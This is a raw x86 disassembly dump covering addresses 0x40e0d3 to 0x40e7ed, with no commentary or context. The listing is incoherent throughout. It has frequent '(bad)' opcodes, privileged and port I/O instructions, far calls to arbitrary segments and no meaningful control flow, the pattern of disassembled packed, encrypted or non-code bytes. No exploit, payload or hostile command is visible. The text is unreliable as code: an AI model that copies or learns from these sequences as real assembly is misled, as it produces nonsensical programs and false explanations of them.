  40e0d3:	xor    esp,edx
  40e0d5:	jno    0x40e0df
  40e0d7:	jmp    0x40e116
  40e0d9:	(bad)  
  40e0da:	mov    cl,0x17
  40e0dc:	mov    cl,0xc2
  40e0de:	fstp   DWORD PTR [esi+0x7]
  40e0e1:	loop   0x40e14c
  40e0e3:	xor    DWORD PTR [esi-0x43],eax
  40e0e6:	jp     0x40e13a
  40e0e8:	push   eax
  40e0e9:	shl    BYTE PTR [edi+0x11],cl
  40e0ec:	xchg   DWORD PTR [esi+0x18],edi
  40e0ef:	cmp    al,0xed
  40e0f1:	xchg   edi,eax
  40e0f2:	adc    dh,BYTE PTR [edi+0x657d3f41]
  40e0f8:	and    DWORD PTR [eax],ecx
  40e0fa:	stos   BYTE PTR es:[edi],al
  40e0fb:	test   DWORD PTR fs:[ebx+0x68],0x337a47eb
  40e103:	push   ecx
  40e104:	xor    BYTE PTR [esi+edi*2-0x6e],ch
  40e108:	aaa    
  40e109:	xchg   esp,eax
  40e10a:	push   ebp
  40e10b:	xchg   ch,bh
  40e10d:	jno    0x40e0d1
  40e10f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e110:	sub    eax,0x3f4d124e
  40e115:	stos   BYTE PTR es:[edi],al
  40e116:	inc    esp
  40e117:	daa    
  40e118:	pop    eax
  40e119:	lea    edi,[esi+0x16]
  40e11c:	xchg   ebx,eax
  40e11d:	pop    ss
  40e11e:	xor    al,BYTE PTR [ecx+esi*1+0x27ddae4b]
  40e125:	jne    0x40e17b
  40e127:	or     eax,0x7162f32
  40e12c:	dec    ebx
  40e12d:	xor    DWORD PTR [ebp-0x43893b87],0x59f4d0dd
  40e137:	sub    BYTE PTR [edx],dh
  40e139:	xchg   ebx,eax
  40e13a:	lock mov dh,BYTE PTR [ebx]
  40e13d:	je     0x40e152
  40e13f:	test   al,0x20
  40e141:	test   eax,0x5928d03c
  40e146:	lea    esp,[esi]
  40e148:	cs aaa 
  40e14a:	fsub   QWORD PTR [edi-0x1b]
  40e14d:	mov    dh,bh
  40e14f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e150:	fs jnp 0x40e15c
  40e153:	xor    eax,ebp
  40e155:	call   0xd56b3b3c
  40e15a:	shl    BYTE PTR [edx+0x26],cl
  40e15d:	mov    ebp,DWORD PTR [eax+esi*4]
  40e160:	mov    ss:0x61b6fe7a,al
  40e166:	or     DWORD PTR [esi+ecx*8+0x39],0x71
  40e16b:	push   ss
  40e16c:	into   
  40e16d:	xor    ah,BYTE PTR [ecx]
  40e16f:	repnz xor al,0xde
  40e172:	fsub   QWORD PTR [edi-0x75]
  40e175:	gs xchg esi,eax
  40e177:	jno    0x40e16d
  40e179:	ja     0x40e194
  40e17b:	jp     0x40e187
  40e17d:	retf   
  40e17e:	dec    eax
  40e17f:	cmp    al,0x7d
  40e181:	test   eax,0x527a8dc7
  40e186:	aaa    
  40e187:	rol    BYTE PTR [edx-0x5ea8e24c],cl
  40e18d:	or     edx,eax
  40e18f:	mov    eax,0xaf266eaa
  40e194:	or     esp,DWORD PTR [esi+ebx*2+0x1d]
  40e198:	aad    0x1c
  40e19a:	repz inc edi
  40e19c:	mov    dh,0x7e
  40e19e:	mov    WORD PTR ds:0x34fa417d,ds
  40e1a4:	test   eax,0xab6e88c2
  40e1a9:	push   ecx
  40e1aa:	rcr    BYTE PTR [ecx-0x22],1
  40e1ad:	sub    cl,cl
  40e1af:	mov    dh,0x2e
  40e1b1:	repz mov eax,0x538317a2
  40e1b7:	test   ebx,esi
  40e1b9:	(bad)
  40e1bd:	int    0xae
  40e1bf:	repz mov ds,esp
  40e1c2:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  40e1c4:	inc    ebx
  40e1c5:	retf   0xabc1
  40e1c8:	shl    DWORD PTR [ecx],cl
  40e1ca:	adc    bh,BYTE PTR [edi-0x60bf60e7]
  40e1d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1d1:	and    cl,dl
  40e1d3:	mov    dh,0xdb
  40e1d5:	jge    0x40e22b
  40e1d7:	repz out dx,eax
  40e1d9:	or     DWORD PTR [eax-0x3488d632],0x3d
  40e1e0:	scas   eax,DWORD PTR es:[edi]
  40e1e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1e2:	push   ecx
  40e1e3:	stos   BYTE PTR es:[edi],al
  40e1e4:	outs   dx,BYTE PTR ds:[esi]
  40e1e5:	out    0x6,eax
  40e1e7:	fst    st(6)
  40e1e9:	mov    dl,0xf1
  40e1eb:	xor    dh,cl
  40e1ed:	xor    al,0x38
  40e1ef:	push   cs
  40e1f0:	pop    esp
  40e1f1:	push   esi
  40e1f2:	popa   
  40e1f3:	push   edi
  40e1f4:	sbb    DWORD PTR [ecx],0xffffffdb
  40e1f7:	mov    ch,0x45
  40e1f9:	sbb    al,0xf9
  40e1fb:	(bad)  
  40e1fd:	imul   ecx,DWORD PTR [eax-0x19],0xf366547c
  40e204:	ins    DWORD PTR es:[edi],dx
  40e205:	dec    edi
  40e206:	stos   DWORD PTR es:[edi],eax
  40e207:	mov    ecx,0x67343634
  40e20c:	leave  
  40e20d:	or     esp,DWORD PTR [esi]
  40e20f:	and    ebp,DWORD PTR [eax+0x18aa2a]
  40e215:	push   eax
  40e216:	sbb    DWORD PTR [ebp+0x276e1d9c],esi
  40e21c:	push   edx
  40e21d:	inc    DWORD PTR [edi+0x45c5ff7a]
  40e223:	aad    0xf2
  40e225:	jnp    0x40e1a8
  40e227:	call   0xecc5:0xaff8ac6a
  40e22e:	push   ax
  40e230:	out    0xc9,al
  40e232:	add    al,0x8d
  40e234:	stos   BYTE PTR es:[edi],al
  40e235:	or     ecx,edx
  40e237:	jmp    0x40e26c
  40e239:	cli    
  40e23a:	add    DWORD PTR [ebp-0x80],edi
  40e23d:	arpl   WORD PTR [ecx-0x58],dx
  40e240:	or     DWORD PTR [edx-0x2],ebp
  40e243:	xchg   ebx,eax
  40e244:	jp     0x40e276
  40e246:	outs   dx,BYTE PTR ds:[esi]
  40e247:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e248:	fsub   QWORD PTR [ebx-0x6]
  40e24b:	popf   
  40e24c:	fcom   QWORD PTR [esi-0x72]
  40e24f:	fnstcw WORD PTR [esp+edi*4]
  40e252:	mov    ?,WORD PTR [esi+ecx*8+0x2e]
  40e256:	jge    0x40e282
  40e258:	int    0xb1
  40e25a:	add    dl,BYTE PTR [esi]
  40e25c:	stos   BYTE PTR es:[edi],al
  40e25d:	in     eax,0x62
  40e25f:	(bad)  
  40e260:	jl     0x40e290
  40e262:	xchg   edx,eax
  40e263:	jge    0x40e266
  40e265:	out    0x65,eax
  40e267:	mov    ch,BYTE PTR [edx]
  40e269:	(bad)  
  40e26a:	(bad)  
  40e26b:	push   ds
  40e26c:	fld    DWORD PTR [ebx+edi*8]
  40e26f:	in     al,0x6e
  40e271:	mov    ebp,0x2e0eff0b
  40e276:	adc    eax,0x2267e235
  40e27b:	sbb    ebp,ebx
  40e27d:	sbb    eax,0x65821685
  40e282:	jno    0x40e278
  40e284:	pop    es
  40e285:	xchg   ebx,eax
  40e286:	faddp  st(6),st
  40e288:	clc    
  40e289:	fdiv   DWORD PTR [ebx+edi*4+0x20]
  40e28d:	(bad)  
  40e28e:	and    BYTE PTR [esi+0x65f1b176],bl
  40e294:	addr16 out 0x30,eax
  40e297:	push   es
  40e298:	xchg   ebx,eax
  40e299:	cmp    bh,BYTE PTR [ebp+ecx*8-0x47]
  40e29d:	stos   DWORD PTR es:[edi],eax
  40e29e:	inc    edi
  40e29f:	cld    
  40e2a0:	push   ebp
  40e2a1:	sbb    ecx,DWORD PTR [esp+ecx*2+0x2c2d8f4]
  40e2a8:	sbb    ecx,eax
  40e2aa:	jecxz  0x40e2f6
  40e2ac:	sub    al,0xc5
  40e2ae:	cdq    
  40e2af:	push   0x557c552e
  40e2b4:	pop    ecx
  40e2b5:	sbb    DWORD PTR [esi+0x116d036d],0xcf2e88a
  40e2bf:	xor    BYTE PTR ss:[edi+0x22],bh
  40e2c3:	stc    
  40e2c4:	loop   0x40e269
  40e2c6:	or     eax,0xa611c982
  40e2cb:	cmc    
  40e2cc:	addr16 adc eax,0xb20c5a6f
  40e2d2:	shl    esi,0xee
  40e2d5:	and    eax,0xe18b48e1
  40e2da:	std    
  40e2db:	push   edx
  40e2dc:	push   cs
  40e2dd:	fidivr WORD PTR [eax-0x1aed7517]
  40e2e3:	je     0x40e31e
  40e2e5:	or     al,0x67
  40e2e7:	fst    st(2)
  40e2e9:	sbb    ah,bl
  40e2eb:	inc    edx
  40e2ec:	add    dh,BYTE PTR [edi+edi*1-0xe9e26aa]
  40e2f3:	push   ds
  40e2f4:	xor    eax,0x5f79ccca
  40e2f9:	arpl   WORD PTR [ecx+0x43],ax
  40e2fc:	xlat   BYTE PTR ds:[ebx]
  40e2fd:	or     al,0x60
  40e2ff:	icebp  
  40e300:	cmp    ecx,DWORD PTR [esi-0x58c849ce]
  40e306:	mov    ds:0xfd395a3f,eax
  40e30b:	sti    
  40e30c:	fbld   TBYTE PTR [ecx]
  40e30e:	mov    ebp,0xf4fd024e
  40e313:	out    dx,al
  40e314:	into   
  40e315:	sub    ch,BYTE PTR [edx]
  40e317:	popa   
  40e318:	mov    DWORD PTR [ebp+0x199441b5],esp
  40e31e:	pop    ebp
  40e31f:	ins    DWORD PTR es:[edi],dx
  40e320:	(bad)  
  40e321:	mov    ebx,0x5a22230a
  40e326:	adc    al,dl
  40e328:	pop    ss
  40e329:	and    al,0xf0
  40e32b:	inc    eax
  40e32c:	xor    dh,BYTE PTR [eax+0x755292dc]
  40e332:	dec    ebx
  40e333:	or     ch,BYTE PTR [ecx-0x1]
  40e336:	xor    bh,dl
  40e338:	add    ah,BYTE PTR [eax+0x2c33c199]
  40e33e:	jae    0x40e32e
  40e340:	dec    esi
  40e341:	xor    al,0x56
  40e343:	xchg   esi,eax
  40e344:	dec    edx
  40e345:	arpl   WORD PTR [ebx-0x711701c3],bx
  40e34b:	in     eax,0x95
  40e34d:	int3   
  40e34e:	inc    ecx
  40e34f:	push   ebx
  40e350:	retf   
  40e351:	es mov ebx,0xf10891d9
  40e357:	fdivr  QWORD PTR [esi]
  40e359:	mov    eax,0x8eb4bab4
  40e35e:	ins    DWORD PTR es:[edi],dx
  40e35f:	adc    edx,edi
  40e361:	cli    
  40e362:	ret    
  40e363:	(bad)  
  40e364:	xlat   BYTE PTR ds:[ebx]
  40e365:	std    
  40e366:	pop    edi
  40e367:	mov    ah,0x2
  40e369:	cmp    al,0x54
  40e36b:	inc    ebp
  40e36c:	mov    ds:0x42a86a6,al
  40e371:	jl     0x40e3e0
  40e373:	popf   
  40e374:	(bad)  
  40e375:	jp     0x40e36b
  40e377:	or     BYTE PTR [ebx+0x5c],bl
  40e37a:	jnp    0x40e335
  40e37c:	retf   
  40e37d:	xchg   esi,eax
  40e37e:	loop   0x40e339
  40e380:	sbb    BYTE PTR [edi+0x76],0xb3
  40e384:	sub    al,0x95
  40e386:	push   esi
  40e387:	cmp    BYTE PTR [esi+0x46b921f4],cl
  40e38d:	std    
  40e38e:	sbb    al,0xf0
  40e390:	xchg   ecx,eax
  40e391:	add    al,0xb9
  40e393:	lahf   
  40e394:	fucomi st,st(1)
  40e396:	mov    esi,0x9cf50932
  40e39b:	push   edx
  40e39c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e39d:	inc    ebx
  40e39e:	inc    DWORD PTR [ebx+ebp*2-0x1d]
  40e3a2:	fist   DWORD PTR [eax+0x6bd5840e]
  40e3a8:	es nop
  40e3aa:	xor    eax,DWORD PTR ds:0xc2c92361
  40e3b0:	(bad)  
  40e3b1:	int    0x38
  40e3b3:	adc    WORD PTR [eax],ax
  40e3b6:	das    
  40e3b7:	ja     0x40e3fd
  40e3b9:	out    dx,eax
  40e3ba:	sar    DWORD PTR [esi-0x48914532],cl
  40e3c0:	arpl   WORD PTR [edi-0x1b6d97c],bx
  40e3c6:	mov    ch,0x79
  40e3c8:	xchg   edx,eax
  40e3c9:	add    ah,BYTE PTR [edi]
  40e3cb:	sti    
  40e3cc:	or     al,0x83
  40e3ce:	les    ecx,FWORD PTR [edx+0x2acd99f8]
  40e3d4:	xchg   edi,eax
  40e3d5:	retf   
  40e3d6:	mov    al,0x30
  40e3d8:	mov    eax,ds:0xcbfc070f
  40e3dd:	aas    
  40e3de:	popa   
  40e3df:	pushf  
  40e3e0:	cmp    edi,DWORD PTR [edi+0x1a]
  40e3e3:	std    
  40e3e4:	(bad)  
  40e3e5:	in     eax,0x6
  40e3e7:	add    DWORD PTR [edx+0x26],ebx
  40e3ea:	xor    ch,al
  40e3ec:	cmc    
  40e3ed:	sti    
  40e3ee:	call   0x5c631621
  40e3f3:	pop    ds
  40e3f4:	in     eax,0x8c
  40e3f6:	adc    eax,0xde2e0bca
  40e3fb:	sbb    DWORD PTR [eax+0x3b0f633c],esi
  40e401:	adc    al,0x39
  40e403:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e404:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e405:	xchg   ebp,eax
  40e406:	mov    bl,0x6b
  40e408:	sub    dl,bh
  40e40a:	int3   
  40e40b:	aad    0xdf
  40e40d:	addr16 test eax,0xd062b5b2
  40e413:	std    
  40e414:	leave  
  40e415:	iret   
  40e416:	dec    esi
  40e417:	repz pop ebp
  40e419:	test   DWORD PTR [edx],esi
  40e41b:	das    
  40e41c:	dec    esp
  40e41d:	pusha  
  40e41e:	fs mov eax,0x9acc86a1
  40e424:	mov    esi,0x88b67890
  40e429:	or     BYTE PTR [ebx+0x66],bh
  40e42c:	push   ss
  40e42d:	jb     0x40e47b
  40e42f:	adc    al,0xbc
  40e431:	pop    edx
  40e432:	jmp    esi
  40e434:	(bad)  
  40e435:	int    0xe6
  40e437:	sub    eax,0x9a190c3
  40e43c:	pusha  
  40e43d:	inc    edi
  40e43e:	mov    dh,0x1d
  40e440:	pop    ecx
  40e441:	divps  xmm5,XMMWORD PTR ds:0xad0305aa
  40e448:	adc    BYTE PTR [ecx-0x4b],0x9f
  40e44c:	scas   eax,DWORD PTR es:[edi]
  40e44d:	rcr    eax,0xd3
  40e450:	pop    ebx
  40e451:	into   
  40e452:	inc    eax
  40e453:	mov    cr5,esi
  40e456:	aas    
  40e457:	pop    edi
  40e458:	and    BYTE PTR [eax+0x5a087df3],ah
  40e45e:	push   esp
  40e45f:	adc    edx,0xffffffe0
  40e462:	inc    ecx
  40e463:	xchg   DWORD PTR [ecx+ebp*8-0x4f7db404],eax
  40e46a:	fcom   QWORD PTR [ecx+0x25780f59]
  40e470:	retf   0xfa25
  40e473:	sub    DWORD PTR [esi+0x5a],0xc4bd997a
  40e47a:	mov    ah,0x5c
  40e47c:	jmp    0x40e457
  40e47e:	fmul   QWORD PTR [edx]
  40e481:	stos   DWORD PTR es:[edi],eax
  40e482:	fild   DWORD PTR [ecx]
  40e484:	and    ch,al
  40e486:	lods   al,BYTE PTR ds:[esi]
  40e487:	xchg   edx,eax
  40e488:	and    eax,0x23bada7d
  40e48d:	bound  eax,QWORD PTR [eax+0x2f]
  40e490:	pop    ecx
  40e491:	cmp    eax,0x9d87a6a6
  40e496:	fld    DWORD PTR [ebx]
  40e498:	mov    ebp,0x9eea884e
  40e49d:	int    0x60
  40e49f:	pop    esp
  40e4a0:	movzx  edx,BYTE PTR [edi]
  40e4a3:	ins    BYTE PTR es:[edi],dx
  40e4a4:	inc    esp
  40e4a5:	jp     0x40e4b5
  40e4a7:	add    al,0x31
  40e4a9:	and    al,0x6c
  40e4ab:	adc    eax,0x31ad7643
  40e4b0:	cmp    ch,bl
  40e4b2:	ror    BYTE PTR [eax-0x7d],cl
  40e4b5:	retf   
  40e4b6:	cmp    ebp,DWORD PTR [ebx+0x1aedac43]
  40e4bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4bd:	loope  0x40e4cf
  40e4bf:	mov    bh,0xdb
  40e4c1:	loope  0x40e4f0
  40e4c3:	push   0x37
  40e4c5:	sbb    ecx,0xd3b5d2a6
  40e4cb:	dec    eax
  40e4cc:	xchg   edi,eax
  40e4cd:	push   eax
  40e4ce:	loope  0x40e45f
  40e4d0:	mov    bl,0xff
  40e4d2:	adc    esi,ebx
  40e4d4:	sub    eax,0x2def561f
  40e4d9:	pushf  
  40e4da:	in     eax,0xe2
  40e4dc:	frstor [esi+0x3a15887e]
  40e4e2:	fcomip st,st(3)
  40e4e4:	xor    eax,0x78a6272c
  40e4e9:	jmp    0x1b117384
  40e4ee:	(bad)  
  40e4ef:	sbb    DWORD PTR [eax+0x72d859e9],edx
  40e4f5:	dec    esp
  40e4f6:	shl    WORD PTR [edi+eiz*4+0x661c6847],1
  40e4fe:	push   cs
  40e4ff:	pusha  
  40e500:	scas   al,BYTE PTR es:[edi]
  40e501:	adc    al,0x73
  40e503:	adc    eax,0x26e9e1b0
  40e508:	xlat   BYTE PTR ds:[ebx]
  40e509:	out    dx,al
  40e50a:	repnz bound ecx,QWORD PTR [ebx+0x1]
  40e50e:	retf   0xce6d
  40e511:	es push ss
  40e513:	inc    ebx
  40e514:	jnp    0x40e511
  40e516:	push   ss
  40e517:	inc    esp
  40e518:	pop    ebx
  40e519:	out    0x1,al
  40e51b:	xchg   ebx,eax
  40e51c:	mov    cl,0xfe
  40e51e:	inc    edi
  40e51f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e520:	cmc    
  40e521:	add    DWORD PTR [edx],esp
  40e523:	push   cs
  40e524:	jge    0x40e4b8
  40e526:	mov    ds:0x989a5b3e,eax
  40e52b:	in     al,0x2e
  40e52d:	dec    esi
  40e52e:	out    0xaa,al
  40e530:	add    eax,0xfd8441d0
  40e535:	stc    
  40e536:	push   cs
  40e537:	sub    eax,0xae1740b3
  40e53c:	ret    0xa7e0
  40e53f:	cmp    edx,edi
  40e541:	pop    ss
  40e542:	call   0x95d:0xbd1219e3
  40e549:	jns    0x40e592
  40e54b:	jae    0x40e565
  40e54d:	fisub  DWORD PTR [esp+eax*8]
  40e550:	rcl    BYTE PTR [ecx-0x37],cl
  40e553:	in     eax,0x58
  40e555:	ds loope 0x40e519
  40e558:	xchg   edx,eax
  40e559:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e55a:	push   ss
  40e55b:	pusha  
  40e55c:	push   edi
  40e55d:	cli    
  40e55e:	scas   eax,DWORD PTR es:[edi]
  40e55f:	sti    
  40e560:	xchg   ecx,eax
  40e561:	jge    0x40e4fc
  40e563:	daa    
  40e564:	and    ebx,DWORD PTR [edx+0x24]
  40e567:	ret    0x14b4
  40e56a:	mov    edi,0x1cf9cd0e
  40e56f:	add    bh,0xf0
  40e572:	shl    DWORD PTR [ecx-0x51],0xea
  40e576:	(bad)  
  40e577:	dec    esi
  40e578:	inc    ebx
  40e579:	aad    0x91
  40e57b:	out    0x2b,al
  40e57d:	pop    edx
  40e57e:	adc    DWORD PTR [edx],eax
  40e580:	cmc    
  40e581:	inc    edi
  40e582:	inc    ebx
  40e583:	mov    ch,0xe2
  40e585:	test   al,0xe3
  40e587:	adc    BYTE PTR [ecx+edx*1-0x6],0x52
  40e58c:	scas   eax,DWORD PTR es:[edi]
  40e58d:	aam    0x9b
  40e58f:	clc    
  40e590:	inc    edx
  40e591:	jmp    0xbfbc:0x6bab787d
  40e598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e599:	push   ds
  40e59a:	shl    DWORD PTR [ebp+ebx*2+0x1e],0x31
  40e59f:	adc    BYTE PTR ds:0xc82eecf7,al
  40e5a5:	add    BYTE PTR [eax+eax*8-0x43],cl
  40e5a9:	sbb    DWORD PTR [ebx-0x29],esp
  40e5ac:	mov    eax,ss
  40e5ae:	int    0xeb
  40e5b0:	lods   eax,DWORD PTR ds:[esi]
  40e5b1:	dec    eax
  40e5b2:	test   eax,0xf39d0b9f
  40e5b7:	xor    cl,BYTE PTR [eax+esi*2]
  40e5ba:	iret   
  40e5bb:	sub    eax,0x4b4e6ad8
  40e5c0:	sub    bl,bl
  40e5c2:	inc    esi
  40e5c3:	mov    eax,0x38af52a3
  40e5c8:	lods   eax,DWORD PTR ds:[esi]
  40e5c9:	clc    
  40e5ca:	fidivr DWORD PTR [ebp+0x7e]
  40e5cd:	mov    bh,0xa2
  40e5cf:	ins    BYTE PTR es:[edi],dx
  40e5d0:	xor    BYTE PTR [eax+esi*2],bh
  40e5d3:	cld    
  40e5d4:	dec    edx
  40e5d5:	sub    al,0x19
  40e5d7:	pop    esi
  40e5d8:	lds    ecx,FWORD PTR [esi]
  40e5da:	xchg   ecx,eax
  40e5db:	and    dl,BYTE PTR [eax-0x42]
  40e5de:	pop    ebx
  40e5df:	out    0x94,al
  40e5e1:	adc    al,ah
  40e5e3:	mov    dl,0x1
  40e5e5:	sbb    esi,eax
  40e5e7:	inc    esp
  40e5e8:	in     eax,dx
  40e5e9:	rcr    DWORD PTR [edi],0x19
  40e5ec:	pop    ss
  40e5ed:	scas   al,BYTE PTR es:[edi]
  40e5ee:	pop    ebp
  40e5ef:	inc    ecx
  40e5f0:	mov    ch,0x10
  40e5f2:	pop    edx
  40e5f3:	push   ebx
  40e5f4:	out    dx,al
  40e5f5:	fldcw  WORD PTR [ecx+0x73]
  40e5f8:	sbb    al,0xa4
  40e5fa:	mov    eax,ds:0x8785d828
  40e5ff:	fbstp  TBYTE PTR [ebx-0x7a]
  40e602:	fldcw  WORD PTR ss:[eax+eax*4-0x66]
  40e607:	das    
  40e608:	jmp    0xff9b:0xcfaa6528
  40e60f:	lods   al,BYTE PTR ds:[esi]
  40e610:	push   esi
  40e611:	add    DWORD PTR [ebp+0x50],0xe44017fe
  40e618:	fst    st(7)
  40e61a:	jns    0x40e5f7
  40e61c:	ins    DWORD PTR es:[edi],dx
  40e61d:	pop    edx
  40e61e:	xchg   DWORD PTR [edx],eax
  40e620:	sub    eax,0x206308be
  40e625:	loop   0x40e646
  40e627:	mov    al,ds:0xf58ae749
  40e62c:	adc    ah,BYTE PTR [ecx-0x1a]
  40e62f:	adc    eax,0x61e2736b
  40e634:	pop    edi
  40e635:	inc    eax
  40e636:	mov    WORD PTR [ebp+0x68df2aa1],cs
  40e63c:	fstp   DWORD PTR [ecx-0x29]
  40e63f:	xchg   BYTE PTR [ecx-0x6d],al
  40e642:	inc    ebx
  40e643:	popa   
  40e644:	mov    ch,0xff
  40e646:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e647:	xchg   edi,eax
  40e648:	int3   
  40e649:	test   BYTE PTR [ebx],dl
  40e64b:	pop    esi
  40e64c:	jo     0x40e6af
  40e64e:	xchg   ebp,eax
  40e64f:	lods   al,BYTE PTR ss:[esi]
  40e651:	out    dx,eax
  40e652:	test   ch,0xe7
  40e655:	stos   BYTE PTR es:[edi],al
  40e656:	retf   0xcd5c
  40e659:	lea    edi,[esi+0x44]
  40e65c:	leave  
  40e65d:	sub    dh,BYTE PTR [ecx+ebx*4]
  40e660:	stos   BYTE PTR es:[edi],al
  40e661:	sub    DWORD PTR [eax+edi*1+0xd037a02],esi
  40e668:	mov    eax,ds:0xd54ed683
  40e66d:	(bad)  
  40e66e:	mov    cl,BYTE PTR [ecx-0x73]
  40e671:	in     eax,dx
  40e672:	add    esi,DWORD PTR [eax]
  40e674:	and    DWORD PTR [ebx+0x4181dadd],esp
  40e67a:	xor    eax,0x4422441b
  40e67f:	sbb    DWORD PTR [esi+0x27],esp
  40e682:	or     BYTE PTR [ebx-0x78],0xb2
  40e686:	cmc    
  40e687:	(bad)
  40e68a:	fist   WORD PTR [edx-0x46]
  40e68d:	outs   dx,DWORD PTR ds:[esi]
  40e68e:	push   0xffffff9f
  40e690:	ret    
  40e691:	dec    ecx
  40e692:	inc    edi
  40e693:	dec    eax
  40e694:	loope  0x40e63f
  40e696:	pop    edi
  40e697:	mov    dl,0xce
  40e699:	cmc    
  40e69a:	pop    es
  40e69b:	(bad)  
  40e69c:	fwait
  40e69d:	out    dx,eax
  40e69e:	repnz xchg esp,esi
  40e6a1:	ds inc edx
  40e6a3:	in     al,0x87
  40e6a5:	aaa    
  40e6a6:	pop    esi
  40e6a7:	or     eax,0x7f61e5c3
  40e6ac:	jnp    0x40e6e9
  40e6ae:	repz push esp
  40e6b0:	and    eax,0xebe0eaf8
  40e6b5:	(bad)  
  40e6b6:	push   0xb10ed90
  40e6bb:	pop    eax
  40e6bc:	xchg   BYTE PTR [edx+0x69],al
  40e6bf:	clc    
  40e6c0:	cmp    BYTE PTR [ecx-0x26e615ab],dh
  40e6c6:	sahf   
  40e6c7:	test   eax,0xa38ac95
  40e6cc:	pop    esi
  40e6cd:	inc    esp
  40e6ce:	les    edi,FWORD PTR [edi+0x7e]
  40e6d1:	cmp    dl,BYTE PTR [edi+0x364a0669]
  40e6d7:	sbb    al,0x11
  40e6d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6da:	pop    ss
  40e6db:	xchg   bh,dl
  40e6dd:	or     BYTE PTR [ebx-0x54],dh
  40e6e0:	sahf   
  40e6e1:	loopne 0x40e6e1
  40e6e3:	ja     0x40e6f9
  40e6e5:	scas   eax,DWORD PTR es:[edi]
  40e6e6:	push   eax
  40e6e7:	inc    eax
  40e6e8:	lods   al,BYTE PTR ds:[esi]
  40e6e9:	cmc    
  40e6ea:	into   
  40e6eb:	pop    esi
  40e6ec:	int3   
  40e6ed:	mov    eax,cs
  40e6ef:	adc    al,0x42
  40e6f1:	xor    al,0x1b
  40e6f3:	in     al,0x8f
  40e6f5:	mov    ds:0x14cd30b,eax
  40e6fa:	add    BYTE PTR [edx+0x34a2ba37],cl
  40e700:	mov    al,0xf2
  40e702:	loopne 0x40e6a0
  40e704:	xlat   BYTE PTR ds:[ebx]
  40e705:	xchg   edx,eax
  40e706:	sbb    al,0xaf
  40e708:	imul   eax,ecx,0xf64f9f96
  40e70e:	pop    eax
  40e70f:	mov    ds:0x6202c32d,al
  40e714:	ja     0x40e6f4
  40e716:	arpl   WORD PTR [esi-0x45],bx
  40e719:	(bad)  
  40e71a:	mov    dl,0xd
  40e71c:	rol    al,0x15
  40e71f:	call   0x1f60:0x4e8b9569
  40e726:	or     bh,0xf
  40e729:	cmp    eax,0x79777ea8
  40e72e:	and    BYTE PTR [edx+ebx*8],ah
  40e731:	test   al,0xf0
  40e733:	xchg   esp,eax
  40e734:	sub    esi,DWORD PTR [edx-0x4f]
  40e737:	fs shl ah,1
  40e73a:	jge    0x40e760
  40e73c:	inc    ebx
  40e73d:	(bad)  
  40e73e:	out    dx,eax
  40e73f:	mov    ebx,DWORD PTR ds:0xb62ef8d7
  40e745:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e746:	int3   
  40e747:	pop    eax
  40e748:	inc    ebp
  40e749:	ficom  WORD PTR [ecx-0x4d]
  40e74c:	dec    ebp
  40e74d:	cld    
  40e74e:	cwde   
  40e74f:	mov    ebx,0xe7e39ccd
  40e754:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e755:	cli    
  40e756:	pop    ebp
  40e757:	inc    edx
  40e758:	cmp    DWORD PTR ds:0xcfe93a87,edx
  40e75e:	in     al,0xbf
  40e760:	lods   eax,DWORD PTR ds:[esi]
  40e761:	outs   dx,BYTE PTR ds:[esi]
  40e762:	pushf  
  40e763:	push   ds
  40e764:	(bad)  
  40e765:	mov    eax,ds:0xf88994e1
  40e76a:	dec    edi
  40e76b:	and    dl,BYTE PTR [eax]
  40e76d:	loope  0x40e784
  40e76f:	mov    ebp,0xc9159af8
  40e774:	in     al,dx
  40e775:	push   cs
  40e776:	(bad)  
  40e777:	cdq    
  40e778:	push   ecx
  40e779:	push   esp
  40e77a:	sub    DWORD PTR [eax-0x52c47fa6],ecx
  40e780:	dec    ebp
  40e781:	sar    BYTE PTR [ebx-0x38ea5b17],cl
  40e787:	xchg   esi,eax
  40e788:	mov    esi,0xb257a70a
  40e78d:	popa   
  40e78e:	mov    edx,0x7ba603f8
  40e793:	xchg   DWORD PTR [edi],edi
  40e795:	add    cl,BYTE PTR [ebp+0x1a]
  40e798:	lods   eax,DWORD PTR ds:[esi]
  40e799:	jns    0x40e7a8
  40e79b:	scas   al,BYTE PTR es:[edi]
  40e79c:	cmp    eax,0xdf5b100e
  40e7a1:	dec    ebx
  40e7a2:	scas   eax,DWORD PTR es:[edi]
  40e7a3:	popf   
  40e7a4:	mov    ch,0xe7
  40e7a6:	shr    eax,cl
  40e7a8:	mov    ebx,0x8a71a084
  40e7ad:	(bad)  
  40e7ae:	loopne 0x40e788
  40e7b0:	iret   
  40e7b1:	xor    al,0x9a
  40e7b3:	mov    al,0x1b
  40e7b5:	jl     0x40e805
  40e7b7:	(bad)  
  40e7b8:	repnz sub DWORD PTR [ebx-0x4d04d6e],eax
  40e7bf:	or     edx,DWORD PTR [esi]
  40e7c1:	sub    DWORD PTR [ebx-0x14],ecx
  40e7c4:	push   ds
  40e7c5:	jl     0x40e827
  40e7c7:	cmp    ecx,DWORD PTR [edx+0x52025377]
  40e7cd:	add    DWORD PTR [esi*1+0x3bb7c445],esp
  40e7d4:	lea    edi,[ebp+0x46856ff3]
  40e7da:	int3   
  40e7db:	mov    dl,0x58
  40e7dd:	addr16 lahf 
  40e7df:	fsubr  st,st(7)
  40e7e1:	sub    dh,BYTE PTR [eax+eax*8+0x70dba837]
  40e7e8:	push   eax
  40e7e9:	dec    ecx
  40e7ea:	loope  0x40e7fd
  40e7ec:	inc    edi
  40e7ed:	sub    DWORD PTR [edx-0x474b82c5],0x42
